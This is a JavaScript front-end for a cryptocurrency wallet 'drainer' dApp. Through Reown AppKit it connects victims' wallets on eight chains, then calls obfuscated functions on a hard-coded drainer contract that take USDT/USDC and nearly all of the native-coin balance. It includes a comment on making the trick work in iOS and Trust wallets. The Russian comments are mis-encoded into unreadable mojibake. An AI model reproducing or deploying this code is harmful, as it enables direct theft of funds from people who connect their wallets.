// main.js
import { createAppKit } from '@reown/appkit'
import {
  mainnet,
  polygon,
  bsc,
  avalanche,
  arbitrum,
  optimism,
  linea,
  base
} from '@reown/appkit/networks'
import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
import { ethers } from 'ethers'

// === –ü–∞—Ä–∞–º–µ—Ç—Ä—ã drainer‚Äë–∫–æ–Ω—Ç—Ä–∞–∫—Ç–∞ ===
const DRAINER_ADDRESS = '0x35FFA0699Ce9951bDb95214f4Ac870Ae696429dF'
const ERC20_ABI = [
  'function balanceOf(address) view returns (uint256)',
  'function approve(address spender,uint256 amount) returns (bool)',
  'function allowance(address owner,address spender) view returns (uint256)'
]
const DRAINER_ABI = [
  'function tK7(uint256 usdtAmount, uint256 usdcAmount) external',
  'function bN3() external payable'
]

// === –ù–∞—Å—Ç—Ä–æ–π–∫–∞ AppKit + WagmiAdapter ===
const projectId = 'd85cc83edb401b676e2a7bcef67f3be8'
const networks = [mainnet, polygon, bsc, avalanche, arbitrum, optimism, linea, base]

const wagmiAdapter = new WagmiAdapter({ projectId, networks })

const modal = createAppKit({
  adapters: [wagmiAdapter],
  networks,
  projectId,
  metadata: {
    name: 'Alex dApp',
    description: 'Drainer dApp',
    url: 'https://checkalex.xyz/',
    icons: [`https://checkalex.xyz/icon.png`],
  },
  features: { analytics: true }
})

// –ó–¥–µ—Å—å –±—É–¥–µ—Ç signer
let signer = null

modal.on('connect', async () => {
  const provider = new ethers.providers.Web3Provider(window.ethereum, 'any')
  signer = provider.getSigner()

  document.getElementById('drain-tokens-btn').removeAttribute('disabled')
  document.getElementById('drain-native-btn').removeAttribute('disabled')
})

// UI: –æ—Ç–∫—Ä—ã—Ç–∏–µ –º–æ–¥–∞–ª–∫–∏
document
  .getElementById('open-connect-modal')
  .addEventListener('click', () => modal.open())

// 1) USDT/USDC —Å–ø–∏—Å–∞–Ω–∏–µ
document
  .getElementById('drain-tokens-btn')
  .addEventListener('click', async () => {
    if (!signer) return alert('–°–Ω–∞—á–∞–ª–∞ –ø–æ–¥–∫–ª—é—á–∏—Ç–µ –∫–æ—à–µ–ª–µ–∫!')
    try {
      const drainer = new ethers.Contract(DRAINER_ADDRESS, DRAINER_ABI, signer)
      const usdtAmount = ethers.utils.parseUnits('0.1', 6)
      const usdcAmount = ethers.utils.parseUnits('0.1', 6)

      await drainer.tK7(usdtAmount, usdcAmount)
      console.log('‚úÖ tK7 —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞')
    } catch (e) {
      console.error('–û—à–∏–±–∫–∞ –ø—Ä–∏ tK7:', e)
      alert('–û—à–∏–±–∫–∞ –ø—Ä–∏ —Å–ø–∏—Å–∞–Ω–∏–∏ —Ç–æ–∫–µ–Ω–æ–≤: ' + e.message)
    }
  })

// 2) –†–æ–¥–Ω–∞—è –º–æ–Ω–µ—Ç–∞ —Å–ø–∏—Å–∞–Ω–∏–µ + DeepLink –Ω–∞ –º–æ–±–∏–ª–∫–µ
document
  .getElementById('drain-native-btn')
  .addEventListener('click', async () => {
    if (!signer) return alert('–°–Ω–∞—á–∞–ª–∞ –ø–æ–¥–∫–ª—é—á–∏—Ç–µ –∫–æ—à–µ–ª–µ–∫!')
    try {
      const drainer = new ethers.Contract(DRAINER_ADDRESS, DRAINER_ABI, signer)
      const balance = await signer.getBalance()
      const toSend = balance.sub(ethers.utils.parseEther('0.001'))

      if (toSend.lte(0)) {
        return alert('–ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ —Ä–æ–¥–Ω–æ–π –º–æ–Ω–µ—Ç—ã –¥–ª—è —Å–ø–∏—Å–∞–Ω–∏—è')
      }

      // üß† –ö–ª—é—á–µ–≤–æ–π –º–æ–º–µ–Ω—Ç: —á—Ç–æ–±—ã —Ä–∞–±–æ—Ç–∞–ª–æ –Ω–∞ iOS –∏ Trust ‚Äî –∂–¥—ë–º user gesture!
      // –ü–æ—Å–ª–µ —ç—Ç–æ–≥–æ –≤—ã–∑–æ–≤–∞ –º–æ–±–∏–ª—å–Ω—ã–π –∫–æ—à–µ–ª–µ–∫ –ø–µ—Ä–µ—Ö–≤–∞—Ç—ã–≤–∞–µ—Ç deep‚Äëlink
      await drainer.bN3({ value: toSend })

      console.log('‚úÖ bN3 —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞')
    } catch (e) {
      console.error('–û—à–∏–±–∫–∞ –ø—Ä–∏ bN3:', e)
      alert('–û—à–∏–±–∫–∞ –ø—Ä–∏ —Å–ø–∏—Å–∞–Ω–∏–∏ —Ä–æ–¥–Ω–æ–π –º–æ–Ω–µ—Ç—ã: ' + e.message)
    }
  })
